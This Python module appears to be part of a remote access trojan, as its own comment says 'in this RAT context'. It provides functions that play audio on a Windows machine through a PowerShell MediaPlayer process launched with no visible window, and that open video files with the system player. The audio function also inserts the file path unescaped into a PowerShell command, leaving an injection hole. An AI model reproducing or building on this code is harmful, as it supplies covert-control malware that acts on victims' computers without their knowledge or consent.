import os
import subprocess
import time

def play_audio(file_path):
    """
    Plays audio (mp3, wav, etc.) using PowerShell to avoid visible windows.
    """
    if not os.path.exists(file_path):
        return "File not found."

    # PowerShell command to play audio using WPF MediaPlayer
    # We sleep for a duration to allow playback. Since we don't know duration, 
    # we might just launch it. However, the script needs to stay alive to play.
    # A better way for a fire-and-forget hidden player is tricky without a dedicated process.
    # We will try to keep the powershell process running for a reasonable time or until done.
    # For simplicity in this RAT context, we'll set a long timeout or just let it run in background.
    
    # Note: This powershell snippet creates a media player object and plays. 
    # We need a loop or sleep to keep the process alive while playing.
    # Here we just sleep for 300 seconds (5 mins) as a simple hack, or we could try to detect duration.
    
    ps_command = f"""
    Add-Type -AssemblyName PresentationCore;
    $MediaPlayer = New-Object System.Windows.Media.MediaPlayer;
    $MediaPlayer.Open('{file_path}');
    $MediaPlayer.Play();
    Start-Sleep -s 300; 
    """
    
    try:
        subprocess.Popen(
            ["powershell", "-Command", ps_command],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return "Audio playback started (hidden)."
    except Exception as e:
        return f"Error playing audio: {e}"

def play_video(file_path):
    """
    Plays video using the default system player.
    """
    if not os.path.exists(file_path):
        return "File not found."
    
    try:
        os.startfile(file_path)
        return "Video player launched."
    except Exception as e:
        return f"Error playing video: {e}"
